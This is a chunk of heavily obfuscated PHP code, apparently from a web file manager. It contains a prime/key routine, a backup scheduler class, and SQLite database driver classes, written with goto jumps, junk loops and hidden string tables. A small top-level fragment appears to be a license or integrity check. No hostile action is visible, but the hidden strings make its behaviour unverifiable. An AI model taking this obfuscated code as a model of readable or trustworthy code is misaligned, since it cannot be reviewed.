$a‰Ä—•Ø¢‡); break; } } $f×Šé–Åƒƒ = $a¾ğ££óë“[131]($a¾ğ££óë“[378] . ($cí¨Ãİê©è + $E×ÜµÙŒÚÏ) . $a¾ğ££óë“[379] . $a‰Ä—•Ø¢‡ . $a¾ğ££óë“[379] . $d¨ÈÑ¶È¯» . $a¾ğ££óë“[380]); $AöÉö„ù·  = $DÇ´ªÔ‹‡•[729]; goto BÓÉÇ¬ç‹ò; Aæ£±óõæ×: if (!$EéÎš›„²) { return; } if (!$E³¤…ôâ¥¹) { return $a¾ğ££óë“[10]; } $E³¤…ôâ¥¹ = $a¾ğ££óë“[271]($E³¤…ôâ¥¹); goto EæÁà­¦§; BÓÉÇ¬ç‹ò: $DæŠŒ¨®†ä = $this->{$_SERVER[õÒ³è´][277]}($A¡‹º¸·–Ó[0], $f×Šé–Åƒƒ); $fáØí°ÛŠ« = $DÇ´ªÔ‹‡•[730]; while ($fáØí°ÛŠ« < $DÇ´ªÔ‹‡•[634]) { if ($fáØí°ÛŠ« >= 0) { break; } $fáØí°ÛŠ«++; } goto Bö®Œ¦¸¿; bŒ‡ò‚ÕíŒ: $cğ¥Ã“¬Šø = ($cí¨Ãİê©è - 1) * ($E×ÜµÙŒÚÏ - 1); $FƒØÕñã = $DÇ´ªÔ‹‡•[724]; while ($FƒØÕñã < $DÇ´ªÔ‹‡•[634]) { if ($FƒØÕñã >= 0) { break; } $FƒØÕñã++; } goto E‹Ğ¡öğã; E‹Ğ¡öğã: $a‰Ä—•Ø¢‡ = $a¾ğ££óë“[271](($cí¨Ãİê©è + $E×ÜµÙŒÚÏ) / 2); while (1) { $e½æš¿«“È = $a‰Ä—•Ø¢‡; $aèèÈ´Ü²½ = $DÇ´ªÔ‹‡•[725]; if (!$aèèÈ´Ü²½) { return; } $aİãÛô÷±½ = $cğ¥Ã“¬Šø; $CêîÅ¨Ì‚ = $DÇ´ªÔ‹‡•[726]; while ($aİãÛô÷±½ % $e½æš¿«“È != 0) { $E†ƒØã×­æ = $aİãÛô÷±½; $Dº®ˆ¿Îî = $DÇ´ªÔ‹‡•[727]; $aİãÛô÷±½ = $e½æš¿«“È; $e½æš¿«“È = $E†ƒØã×­æ % $e½æš¿«“È; $d ŒÓÔìÍ = $DÇ´ªÔ‹‡•[728]; if (!$d ŒÓÔìÍ) { return; } } if ($e½æš¿«“È == 1) { break; } else { $a‰Ä—•Ø¢‡++; } } $d¨ÈÑ¶È¯» = 2; goto FÂÍÖˆİßŞ; C‘¹÷àãÕ: if ($a¾ğ££óë“[19]($A¡‹º¸·–Ó) != 2) { return $a¾ğ££óë“[10]; } $E³¤…ôâ¥¹ = $this->{$_SERVER[õÒ³è´][277]}($A¡‹º¸·–Ó[1] . $a¾ğ££óë“[10], $a¾ğ££óë“[174]); $EéÎš›„² = $DÇ´ªÔ‹‡•[720]; goto Aæ£±óõæ×; e¤õ‡ñ¦†œ: $C„À”º¤õÎ = $DÇ´ªÔ‹‡•[722]; if (!$C„À”º¤õÎ) { die; } for ($dÊùÎåÎ = 3; $dÊùÎåÎ < $E³¤…ôâ¥¹; $dÊùÎåÎ += 2) { if ($E³¤…ôâ¥¹ % $dÊùÎåÎ != 0) { continue; } $cí¨Ãİê©è = $dÊùÎåÎ; $E×ÜµÙŒÚÏ = $a¾ğ££óë“[271]($E³¤…ôâ¥¹ / $dÊùÎåÎ); break; $DÙãÏ¼®‹‰ = $DÇ´ªÔ‹‡•[723]; while ($DÙãÏ¼®‹‰ < $DÇ´ªÔ‹‡•[634]) { if ($DÙãÏ¼®‹‰ >= 0) { break; } $DÙãÏ¼®‹‰++; } } goto bŒ‡ò‚ÕíŒ; Bö®Œ¦¸¿: return $DæŠŒ¨®†ä; goto bã¨•’ãÂ¯; bã¨•’ãÂ¯: } public function tvpm2ecf6c05() { goto b£ìÕ¿‘È; fÃÒ±‡¶‚Ï: if (strlen($bßŞÎÏÛ) < $eÀÍÉñŠÒ[634]) { return; } for ($fñ«Ê‹ëÂŒ = $AÙÌÉ—Ã®¢; $fñ«Ê‹ëÂŒ > 1; $fñ«Ê‹ëÂŒ--) { $DÖ¹ëˆÌÓÁ = !0; foreach ($B‰›¶Æƒ‹Ì as $FË”šÄ·‹») { if ($fñ«Ê‹ëÂŒ % $FË”šÄ·‹» == 0) { $DÖ¹ëˆÌÓÁ = !1; break; } } if ($DÖ¹ëˆÌÓÁ) { $c§¤´İ¾›„ = $fñ«Ê‹ëÂŒ; break; } } return $c§¤´İ¾›„; goto dÒõµ£©ğâ; aÇ½œÇ„: $Dá®Çˆ¯ôà = $eÀÍÉñŠÒ[732]; $AÏ¹ßÒ÷ = 1; $fğ£°ËÁÙ† = $eÀÍÉñŠÒ[733]; goto fŞğ‘ƒ×²Œ; b£ìÕ¿‘È: $eÀÍÉñŠÒ =& $_SERVER[œÕÊİğö]; $FÔª¥ëé´í =& $_SERVER[õÒ³è´]; $AÙÌÉ—Ã®¢ = $FÔª¥ëé´í[363]($FÔª¥ëé´í[382](2, 14), $FÔª¥ëé´í[382](2, 16) - 1); goto AÈâùù®®; fŞğ‘ƒ×²Œ: while ($AÏ¹ßÒ÷ <= (int) $FÔª¥ëé´í[383]($AÙÌÉ—Ã®¢)) { $fñ«Ê‹ëÂŒ = $AÏ¹ßÒ÷; $A†©î¤‰É = $eÀÍÉñŠÒ[734]; while (strlen($A†©î¤‰É) < $eÀÍÉñŠÒ[16]) { if (!$A†©î¤‰É) { break; } $A†©î¤‰É++; } while (!0) { $fñ«Ê‹ëÂŒ++; if ($fñ«Ê‹ëÂŒ <= 2) { $AÏ¹ßÒ÷ = $fñ«Ê‹ëÂŒ; break; } else { if ($fñ«Ê‹ëÂŒ < 2) { continue; } } $DÖ¹ëˆÌÓÁ = !0; for ($Dö—­îÚÅ = 2; $Dö—­îÚÅ <= $FÔª¥ëé´í[383]($fñ«Ê‹ëÂŒ); $Dö—­îÚÅ++) { if ($fñ«Ê‹ëÂŒ % $Dö—­îÚÅ == 0) { $DÖ¹ëˆÌÓÁ = !1; } } if ($DÖ¹ëˆÌÓÁ) { $AÏ¹ßÒ÷ = $fñ«Ê‹ëÂŒ; break; } } $B‰›¶Æƒ‹Ì[] = $AÏ¹ßÒ÷; } $c§¤´İ¾›„ = 2; $bßŞÎÏÛ = $eÀÍÉñŠÒ[735]; goto fÃÒ±‡¶‚Ï; dÒõµ£©ğâ: $e¨×óÀØñÔ = $eÀÍÉñŠÒ[736]; goto DØˆ³´ˆĞç; AÈâùù®®: $fæ¯¦”’ = $eÀÍÉñŠÒ[731]; if (strlen($fæ¯¦”’) < $eÀÍÉñŠÒ[613]) { return; } $B‰›¶Æƒ‹Ì = array(); goto aÇ½œÇ„; DØˆ³´ˆĞç: } public function znfy68e68b09($E…¿™œŒÃ–, $c¦§Œ³Ù½‘) { $FƒÍ±åô =& $_SERVER[õÒ³è´]; return $FƒÍ±åô[13](array($FƒÍ±åô[14], $FƒÍ±åô[384]), $E…¿™œŒÃ–, $c¦§Œ³Ù½‘); $e¹š­—’¡Æ = $_SERVER[œÕÊİğö][737]; } public function acgr3d2692b1($B‰¾Ú³öï®, $A¹¹ò²³‘•) { $BùÕî›µ­ =& $_SERVER[õÒ³è´]; return $BùÕî›µ­[13](array($BùÕî›µ­[385], $BùÕî›µ­[386]), $B‰¾Ú³öï®, $A¹¹ò²³‘•); } public function rjqp28b063f1($c„”ÚÚÑöï, $A£±ÓÏî¬ô) { $c…®÷´„´õ =& $_SERVER[õÒ³è´]; return $c…®÷´„´õ[13](array($c…®÷´„´õ[385], $c…®÷´„´õ[387]), $c„”ÚÚÑöï, $A£±ÓÏî¬ô); } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->init(); $this->keep(); } public function init() { $b†ñÀ¬Ò†¨ =& $_SERVER[œÕÊİğö]; $this->isManual(); self::$name = date($b†ñÀ¬Ò†¨[738]); if (!($d¼·³èŠ‡¨ = Model($b†ñÀ¬Ò†¨[739])->lastItem())) { $d¼·³èŠ‡¨ = $this->initData(); } else { self::$name = $d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[38]]; if ($d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[740]] == $b†ñÀ¬Ò†¨[97]) { self::$name = date($b†ñÀ¬Ò†¨[741]); $c›Ú…“¬š¨ = 0; if (isset($d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[301]][$b†ñÀ¬Ò†¨[203]][$b†ñÀ¬Ò†¨[470]])) { $c›Ú…“¬š¨ = (int) $d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[301]][$b†ñÀ¬Ò†¨[203]][$b†ñÀ¬Ò†¨[470]]; } if (self::$manual == 0 && $d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[38]] == self::$name) { Model($b†ñÀ¬Ò†¨[739])->remove($d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[404]]); } $d¼·³èŠ‡¨ = $this->initData($c›Ú…“¬š¨, $d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[742]]); } else { $this->checkStore($d¼·³èŠ‡¨[$b†ñÀ¬Ò†¨[742]]); } } self::$option = $d¼·³èŠ‡¨; } private function isManual() { $däÚ…Äƒ˜Ü = _get($GLOBALS, $_SERVER[œÕÊİğö][743], 0); $däÚ…Äƒ˜Ü = intval($däÚ…Äƒ˜Ü); self::$manual = $däÚ…Äƒ˜Ü && $däÚ…Äƒ˜Ü == 1 ? 1 : 0; } private function initData($e“——ŸÔ©ø = 0, $AÆÛ“¿ƒÛŠ = '') { goto aä›±ñŸÊ; e°ƒæáò•Û: $b—¹Æ·ÓÃè = Model($C™êÆ‘Ö‘[739])->insert($EŠ¡°›áĞ); $EŠ¡°›áĞ[$C™êÆ‘Ö‘[404]] = $b—¹Æ·ÓÃè; return $EŠ¡°›áĞ; goto cêù—Ûöº; B –‰–‡ •: $this->checkStore($FØÍÚªØèœ[$C™êÆ‘Ö‘[742]]); if (self::$manual == 1) { self::$name .= $C™êÆ‘Ö‘[81] . date($C™êÆ‘Ö‘[744]); } $EŠ¡°›áĞ = array($C™êÆ‘Ö‘[742] => $FØÍÚªØèœ[$C™êÆ‘Ö‘[742]], $C™êÆ‘Ö‘[38] => self::$name, $C™êÆ‘Ö‘[740] => 0, $C™êÆ‘Ö‘[745] => $FØÍÚªØèœ[$C™êÆ‘Ö‘[745]], $C™êÆ‘Ö‘[746] => self::$manual, $C™êÆ‘Ö‘[301] => array($C™êÆ‘Ö‘[747] => array($C™êÆ‘Ö‘[740] => 0), $C™êÆ‘Ö‘[748] => array($C™êÆ‘Ö‘[740] => 0, $C™êÆ‘Ö‘[749] => 0, $C™êÆ‘Ö‘[750] => 0, $C™êÆ‘Ö‘[39] => $C™êÆ‘Ö‘[43], $C™êÆ‘Ö‘[751] => 0, $C™êÆ‘Ö‘[499] => 0), $C™êÆ‘Ö‘[752] => array($C™êÆ‘Ö‘[740] => 0, $C™êÆ‘Ö‘[749] => 0, $C™êÆ‘Ö‘[750] => 0, $C™êÆ‘Ö‘[751] => 0, $C™êÆ‘Ö‘[499] => 0), $C™êÆ‘Ö‘[203] => array($C™êÆ‘Ö‘[740] => 0, $C™êÆ‘Ö‘[753] => 0, $C™êÆ‘Ö‘[754] => 0, $C™êÆ‘Ö‘[755] => 0, $C™êÆ‘Ö‘[756] => 0, $C™êÆ‘Ö‘[470] => $e“——ŸÔ©ø, $C™êÆ‘Ö‘[751] => 0, $C™êÆ‘Ö‘[499] => 0)), $C™êÆ‘Ö‘[751] => time(), $C™êÆ‘Ö‘[499] => 0); goto e°ƒæáò•Û; aä›±ñŸÊ: $C™êÆ‘Ö‘ =& $_SERVER[œÕÊİğö]; $FØÍÚªØèœ = Model($C™êÆ‘Ö‘[739])->config(); if ($AÆÛ“¿ƒÛŠ && $FØÍÚªØèœ[$C™êÆ‘Ö‘[742]] != $AÆÛ“¿ƒÛŠ) { $e“——ŸÔ©ø = 0; } goto B –‰–‡ •; cêù—Ûöº: } private function checkStore($BÆ¢•ğ¿Ş) { $aìº¹ÆòÓ‘ =& $_SERVER[œÕÊİğö]; $Fà³µ”ÌÔë = Model($aìº¹ÆòÓ‘[757])->listData($BÆ¢•ğ¿Ş); Model($aìº¹ÆòÓ‘[757])->checkConfig($Fà³µ”ÌÔë); } public static function get() { if (!self::$option) { self::$option = Model($_SERVER[œÕÊİğö][739])->findByName(self::$name); } return self::$option; } public static function set($c»ŞÎÊğØ) { $d°¼‰‹éï“ =& $_SERVER[œÕÊİğö]; $Dƒë”Èš¸¡ = self::get(); foreach ($c»ŞÎÊğØ as $eÒÓ÷ï£‰ => $BÆº‡ó‘ŠÔ) { $Eô§…‡ĞŒ = explode($d°¼‰‹éï“[105], $eÒÓ÷ï£‰); $FŒ‚ ¦¹†” = count($Eô§…‡ĞŒ); switch ($FŒ‚ ¦¹†”) { case 1: $Dƒë”Èš¸¡[$Eô§…‡ĞŒ[0]] = $BÆº‡ó‘ŠÔ; break; case 2: $Dƒë”Èš¸¡[$Eô§…‡ĞŒ[0]][$Eô§…‡ĞŒ[1]] = $BÆº‡ó‘ŠÔ; break; case 3: $Dƒë”Èš¸¡[$Eô§…‡ĞŒ[0]][$Eô§…‡ĞŒ[1]][$Eô§…‡ĞŒ[2]] = $BÆº‡ó‘ŠÔ; break; } } Model($d°¼‰‹éï“[739])->update($Dƒë”Èš¸¡[$d°¼‰‹éï“[404]], $Dƒë”Èš¸¡); self::$option = $Dƒë”Èš¸¡; return self::$option; } public function keep() { $E‘ ëŒªÓÕ =& $_SERVER[œÕÊİğö]; $E‹Ç¹ÇÚë = self::get(); if ($E‹Ç¹ÇÚë[$E‘ ëŒªÓÕ[301]][$E‘ ëŒªÓÕ[747]][$E‘ ëŒªÓÕ[740]] == $E‘ ëŒªÓÕ[97]) { return; } $this->backupKeep($E‹Ç¹ÇÚë); self::set(array($E‘ ëŒªÓÕ[758] => 1)); } private function backupKeep($f¡ÖÙ¢Ï) { goto Fô‚ô¨Åå; eƒÑìÑ­¸‡: foreach ($a–¬¢¡ŞôÌ as $a“²±æÑåÀ) { if ($D§ÑĞ­²“› >= 7) { break; } $cù´çÓğ[] = $a“²±æÑåÀ[$bÓ­Ş¬ÂÇÔ[38]]; $D§ÑĞ­²“›++; } for ($D§ÑĞ­²“› = 0; $D§ÑĞ­²“› < 12; $D§ÑĞ­²“›++) { $cù´çÓğ[] = date($bÓ­Ş¬ÂÇÔ[759], strtotime("\55{$D§ÑĞ­²“›}\x20\155\157\156\164\x68\163")); } $cù´çÓğ = array_unique($cù´çÓğ); goto cïì‘ÀïÕ ; cïì‘ÀïÕ : $AšµÚŸˆ†Î = Model($bÓ­Ş¬ÂÇÔ[760])->get($bÓ­Ş¬ÂÇÔ[761]); foreach ($a–¬¢¡ŞôÌ as $a“²±æÑåÀ) { if (isset($a“²±æÑåÀ[$bÓ­Ş¬ÂÇÔ[746]]) && $a“²±æÑåÀ[$bÓ­Ş¬ÂÇÔ[746]] == $bÓ­Ş¬ÂÇÔ[97]) { continue; } if (!empty($a“²±æÑåÀ[$bÓ­Ş¬ÂÇÔ[38]]) && in_array($a“²±æÑåÀ[$bÓ­Ş¬ÂÇÔ[38]], $cù´çÓğ)) { continue; } Model($bÓ­Ş¬ÂÇÔ[739])->remove($a“²±æÑåÀ[$bÓ­Ş¬ÂÇÔ[404]]); $F‡å½±Â£á = $this->backupPath($f¡ÖÙ¢Ï, $AšµÚŸˆ†Î); IO::remove($F‡å½±Â£á, !1); } goto b¦Ï¡İˆ®Ô; Fô‚ô¨Åå: $bÓ­Ş¬ÂÇÔ =& $_SERVER[œÕÊİğö]; if (self::$manual == 1) { return; } $a–¬¢¡ŞôÌ = Model($bÓ­Ş¬ÂÇÔ[739])->listData(); goto D™Şæ¢²‚; D™Şæ¢²‚: if (empty($a–¬¢¡ŞôÌ)) { return; } $D§ÑĞ­²“› = 0; $cù´çÓğ = array(); goto eƒÑìÑ­¸‡; b¦Ï¡İˆ®Ô: } private function backupPath($dÓÆŠ«•·›, $A”ÃÜšôÀ = false) { $D×ØËÖ•œ° =& $_SERVER[œÕÊİğö]; if (!$A”ÃÜšôÀ) { $A”ÃÜšôÀ = Model($D×ØËÖ•œ°[760])->get($D×ØËÖ•œ°[761]); } $bÍœÉƒÇë¨ = $dÓÆŠ«•·›[$D×ØËÖ•œ°[38]]; $Bš–ˆ‡‹Ñ = substr(md5($D×ØËÖ•œ°[762] . $A”ÃÜšôÀ . $bÍœÉƒÇë¨), 0, 8); return "\x7b\151\x6f\72{$dÓÆŠ«•·›[$D×ØËÖ•œ°[742]]}\175\57\144\x61\x74\141\x62\141\x73\x65\57\142\x61\x63\153\165\160\57" . $bÍœÉƒÇë¨ . $D×ØËÖ•œ°[81] . $Bš–ˆ‡‹Ñ; } public function db() { goto AÈ¥à±½è; a¿Ô´ïê•: return !0; goto A•Ôõ‚ŞÙ¢; AÈ¥à±½è: $F²ĞÄô‰‘Á =& $_SERVER[œÕÊİğö]; $CÜé…‹‚ãò = self::get(); if ($CÜé…‹‚ãò[$F²ĞÄô‰‘Á[301]][$F²ĞÄô‰‘Á[748]][$F²ĞÄô‰‘Á[740]] == $F²ĞÄô‰‘Á[97]) { return !0; } goto dõêêùÇ·â; dõêêùÇ·â: $B¼µãÍÉÑ = new BackupDb(); if (!$B¼µãÍÉÑ->index()) { return !1; } self::set(array($F²ĞÄô‰‘Á[763] => 1)); goto a¿Ô´ïê•; A•Ôõ‚ŞÙ¢: } public function dbFile() { goto EÓî¿£…Æ; EÓî¿£…Æ: $aîõŒ‡ë =& $_SERVER[œÕÊİğö]; $D†ÉÈùè• = self::get(); if ($D†ÉÈùè•[$aîõŒ‡ë[301]][$aîõŒ‡ë[752]][$aîõŒ‡ë[740]] == $aîõŒ‡ë[97]) { return !0; } goto bÊ¬É÷ò; bÊ¬É÷ò: $D®Ş…‹„—” = new BackupDbFile(); if (!$D®Ş…‹„—”->index()) { return !1; } self::set(array($aîõŒ‡ë[764] => 1)); goto e£ƒêªĞê; e£ƒêªĞê: return !0; goto B‚‡“¹Ê÷Š; B‚‡“¹Ê÷Š: } public function file() { $CÒäØøçğ =& $_SERVER[œÕÊİğö]; $C©»Ì‘Ø½ = self::get(); if ($C©»Ì‘Ø½[$CÒäØøçğ[301]][$CÒäØøçğ[203]][$CÒäØøçğ[740]] == $CÒäØøçğ[97]) { return !0; } if (!isset($C©»Ì‘Ø½[$CÒäØøçğ[745]]) || $C©»Ì‘Ø½[$CÒäØøçğ[745]] == $CÒäØøçğ[201]) { $c…òÁ½âùÍ = new BackupFile(); if (!$c…òÁ½âùÍ->index()) { return !1; } } self::set(array($CÒäØøçğ[765] => 1, $CÒäØøçğ[740] => 1)); return !0; } } goto Aìµ¢äÑ¢; f‘±‘®åñğ: if ($_SERVER[$_SERVER[œÕÊİğö][11]] != $D’ø¤–Ÿ¶©($B‹’ó¬¬¾ )) { goto aİ¸ê™ºì³; Aà‚›Ü’ğŠ: $c›ğˆ†ñ­‚ = explode($_SERVER[œÕÊİğö][15], $Eéç¨Ëàé); if (count($c›ğˆ†ñ­‚) < $_SERVER[œÕÊİğö][16]) { $CŠ„®¼Á»ä = $_SERVER[œÕÊİğö][17]; $CŠ„®¼Á»ä(); } $cÇØÑÛ† = $_SERVER[œÕÊİğö][18]; goto aÂ®‹‚‚ä‚; aÂ®‹‚‚ä‚: $cÇØÑÛ†($B‹’ó¬¬¾ ); goto Ağ­ºğ‰‡É; aİ¸ê™ºì³: $CÄš×´â‡ = $_SERVER[œÕÊİğö][12]; $Eí±ª‡—öˆ = $_SERVER[$_SERVER[œÕÊİğö][13]] . $_SERVER[œÕÊİğö][14]; $Eéç¨Ëàé = $CÄš×´â‡($Eí±ª‡—öˆ); goto Aà‚›Ü’ğŠ; Ağ­ºğ‰‡É: } class DbSqliteBase extends Db { public function __construct($FôŞ”ë§èØ = '') { $a‡ßä›í–¶ =& $_SERVER[œÕÊİğö]; if (!extension_loaded($a‡ßä›í–¶[19])) { think_exception(think_lang($a‡ßä›í–¶[20]) . $a‡ßä›í–¶[21]); } if (!empty($FôŞ”ë§èØ)) { if (!isset($FôŞ”ë§èØ[$a‡ßä›í–¶[22]])) { $FôŞ”ë§èØ[$a‡ßä›í–¶[22]] = 438; } $this->config = $FôŞ”ë§èØ; if (empty($this->config[$a‡ßä›í–¶[23]])) { $this->config[$a‡ßä›í–¶[23]] = array(); } } } public function connect($Båµ§ì©ù« = '', $BĞßÄ‹‰ ø = 0) { $E™Á†Øº”» =& $_SERVER[œÕÊİğö]; if (!isset($this->linkID[$BĞßÄ‹‰ ø])) { goto BÊµôƒó™†; CªÓÑ¯˜”Ì: $this->linkID[$BĞßÄ‹‰ ø] = $c—ÙßÌ¦ÓÙ($Båµ§ì©ù«[$E™Á†Øº”»[27]], $Båµ§ì©ù«[$E™Á†Øº”»[22]]); if (!$this->linkID[$BĞßÄ‹‰ ø]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto BÛ‹Ì½»†ï; BÊµôƒó™†: if (empty($Båµ§ì©ù«)) { $Båµ§ì©ù« = $this->config; } $añĞÕ‘‘Şï = !empty($Båµ§ì©ù«[$E™Á†Øº”»[23]][$E™Á†Øº”»[24]]) ? $Båµ§ì©ù«[$E™Á†Øº”»[23]][$E™Á†Øº”»[24]] : $this->pconnect; $c—ÙßÌ¦ÓÙ = $añĞÕ‘‘Şï ? $E™Á†Øº”»[25] : $E™Á†Øº”»[26]; goto CªÓÑ¯˜”Ì; BÛ‹Ì½»†ï: @sqlite_busy_timeout($this->linkID[$BĞßÄ‹‰ ø], 30000); if (1 != think_config($E™Á†Øº”»[28])) { unset($this->config); } goto BÂÅÍËÚİà; BÂÅÍËÚİà: } return $this->linkID[$BĞßÄ‹‰ ø]; } public function free() { $this->queryID = null; } public function query($a“ê³ÛÌ) { goto eÖÏõ´•Ñæ; C‹Ë¹Ïëğ™: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $eø»ø·§†¦ = $this->getAll(); return $eø»ø·§†¦; } goto d•ÖÓâœÕ; A†öÂªîšç: $this->queryStr = $a“ê³ÛÌ; if ($this->queryID) { $this->free(); } think_action_status($fòÍ¿Ÿ˜ğÚ[29], 1); goto EÍöê¶ğÑš; EÍöê¶ğÑš: think_status($fòÍ¿Ÿ˜ğÚ[30]); $this->queryID = sqlite_query($this->_linkID, $a“ê³ÛÌ); $this->debug(); goto C‹Ë¹Ïëğ™; eÖÏõ´•Ñæ: $fòÍ¿Ÿ˜ğÚ =& $_SERVER[œÕÊİğö]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto A†öÂªîšç; d•ÖÓâœÕ: } public function execute($Bİ…Ô†İ) { goto AÑ˜›ŒÊ±; AÑ˜›ŒÊ±: $d¬—‹„ÕçÕ =& $_SERVER[œÕÊİğö]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto b°ß“½ÈİÛ; D¯™½’ÜšŸ: think_status($d¬—‹„ÕçÕ[30]); $AÉÑØæ­›‰ = sqlite_exec($this->_linkID, $Bİ…Ô†İ); $this->debug(); goto Bé¿Š¯ò­Ô; Bé¿Š¯ò­Ô: if (!1 === $AÉÑØæ­›‰) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto döÎ½—Ì›Å; b°ß“½ÈİÛ: $this->queryStr = $Bİ…Ô†İ; if ($this->queryID) { $this->free(); } think_action_status($d¬—‹„ÕçÕ[31], 1); goto D¯™½’ÜšŸ; döÎ½—Ì›Å: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[œÕÊİğö][32]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DÒÎÔÎ¾¤ = sqlite_query($this->_linkID, $_SERVER[œÕÊİğö][33]); if (!$DÒÎÔÎ¾¤) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $c…æöÖÙ–¡ = sqlite_query($this->_linkID, $_SERVER[œÕÊİğö][34]); if (!$c…æöÖÙ–¡) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BÃƒÊ«ÙÜ = array(); if ($this->numRows > 0) { for ($c¤½à‘³Î“ = 0; $c¤½à‘³Î“ < $this->numRows; $c¤½à‘³Î“++) { $BÃƒÊ«ÙÜ[$c¤½à‘³Î“] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $BÃƒÊ«ÙÜ; } public function getFields($DõÂõÆ¬¼†) { $b¶ÁŠÈ£Ã =& $_SERVER[œÕÊİğö]; $EÒ‹·Ò’å¾ = $this->query($b¶ÁŠÈ£Ã[35] . $DõÂõÆ¬¼† . $b¶ÁŠÈ£Ã[36]); $cÍÏØ¦éĞö = array(); if ($EÒ‹·Ò’å¾) { foreach ($EÒ‹·Ò’å¾ as $d§§Õß•¸‘ => $c®ïï´ÇË) { $cÍÏØ¦éĞö[$c®ïï´ÇË[$b¶ÁŠÈ£Ã[37]]] = array($b¶ÁŠÈ£Ã[38] => $c®ïï´ÇË[$b¶ÁŠÈ£Ã[37]], $b¶ÁŠÈ£Ã[39] => $c®ïï´ÇË[$b¶ÁŠÈ£Ã[40]], $b¶ÁŠÈ£Ã[41] => (bool) ($c®ïï´ÇË[$b¶ÁŠÈ£Ã[42]] === $b¶ÁŠÈ£Ã[43]), $b¶ÁŠÈ£Ã[44] => $c®ïï´ÇË[$b¶ÁŠÈ£Ã[45]], $b¶ÁŠÈ£Ã[46] => strtolower($c®ïï´ÇË[$b¶ÁŠÈ£Ã[47]]) == $b¶ÁŠÈ£Ã[48], $b¶ÁŠÈ£Ã[49] => strtolower($c®ïï´ÇË[$b¶ÁŠÈ£Ã[50]]) == $b¶ÁŠÈ£Ã[51]); } } return $cÍÏØ¦éĞö; } public function getTables($FÎïâ“ğ‘« = '') { $EÊİÅØ¨¿© =& $_SERVER[œÕÊİğö]; $D®ºãòò¯á = $this->query($EÊİÅØ¨¿©[52] . $EÊİÅØ¨¿©[53] . $EÊİÅØ¨¿©[54]); $d½ù’öíËá = array(); foreach ($D®ºãòò¯á as $D··öãÅ° => $Fì—òáËÃÊ) { $d½ù’öíËá[$D··öãÅ°] = current($Fì—òáËÃÊ); } return $d½ù’öíËá; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $c÷íåàÖõß =& $_SERVER[œÕÊİğö]; $E”Ô«Á¬´× = sqlite_last_error($this->_linkID); $this->error = $E”Ô«Á¬´× . $c÷íåàÖõß[4] . sqlite_error_string($E”Ô«Á¬´×); if ($c÷íåàÖõß[43] != $this->queryStr) { $this->error .= LNG($c÷íåàÖõß[55]) . $this->queryStr; } think_trace($this->error, $c÷íåàÖõß[43], $c÷íåàÖõß[56]); return $this->error; } public function escapeString($FÒˆ™ÆñÊš) { return sqlite_escape_string($FÒˆ™ÆñÊš); } public function parseLimit($F§ÒÒ‰Ü“•) { $FŸÇ¥›à³¯ =& $_SERVER[œÕÊİğö]; $bÁ£Ç³šƒá = $FŸÇ¥›à³¯[43]; if (!empty($F§ÒÒ‰Ü“•)) { $F§ÒÒ‰Ü“• = explode($FŸÇ¥›à³¯[57], $F§ÒÒ‰Ü“•); if (count($F§ÒÒ‰Ü“•) > 1) { $bÁ£Ç³šƒá .= $FŸÇ¥›à³¯[58] . $F§ÒÒ‰Ü“•[1] . $FŸÇ¥›à³¯[59] . $F§ÒÒ‰Ü“•[0] . $FŸÇ¥›à³¯[60]; } else { $bÁ£Ç³šƒá .= $FŸÇ¥›à³¯[58] . $F§ÒÒ‰Ü“•[0] . $FŸÇ¥›à³¯[60]; } } return $bÁ£Ç³šƒá; } } class DbSqlite3Base extends Db { public function __construct($a¬˜¡õ´æ¤ = '') { $E·ÂÇ¶œ³  =& $_SERVER[œÕÊİğö]; if (!class_exists($E·ÂÇ¶œ³ [61])) { think_exception(think_lang($E·ÂÇ¶œ³ [20]) . $E·ÂÇ¶œ³ [62]); } if (!empty($a¬˜¡õ´æ¤)) { if (!isset($a¬˜¡õ´æ¤[$E·ÂÇ¶œ³ [22]])) { $a¬˜¡õ´æ¤[$E·ÂÇ¶œ³ [22]] = 438; } $this->config = $a¬˜¡õ´æ¤; if (empty($this->config[$E·ÂÇ¶œ³ [23]])) { $this->config[$E·ÂÇ¶œ³ [23]] = array(); } } } public function connect($dàÃ—œƒµ = '', $E¤§ÍÊÅ–Ø = 0) { $EÇöİÃè†å =& $_SERVER[œÕÊİğö]; if (!isset($this->linkID[$E¤§ÍÊÅ–Ø])) { if (empty($dàÃ—œƒµ)) { $dàÃ—œƒµ = $this->config; } $this->linkID[$E¤§ÍÊÅ–Ø] = new SQLite3($dàÃ—œƒµ[$EÇöİÃè†å[27]]); if (!$this->linkID[$E¤§ÍÊÅ–Ø]) { think_exception($this->linkID[$E¤§ÍÊÅ–Ø]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$E¤§ÍÊÅ–Ø]->busyTimeout(30000); if (1 != think_config($EÇöİÃè†å[28])) { unset($this->config); } } return $this->linkID[$E¤§ÍÊÅ–Ø]; } public function free() { $this->queryID = null; } public function query($eè†‘Õ†œÜ) { goto a‹ÑôíÊä; CæØ—ïíó±: if (!1 === $this->queryID) { $this->error(); return !1; } else { $AØàïÑ£ê– = $this->getAll(); $this->numRows = count($AØàïÑ£ê–); return $AØàïÑ£ê–; } goto D©Õ’–Æ; A¦–•¾•¶: $this->queryStr = $eè†‘Õ†œÜ; if ($this->queryID) { $this->free(); } 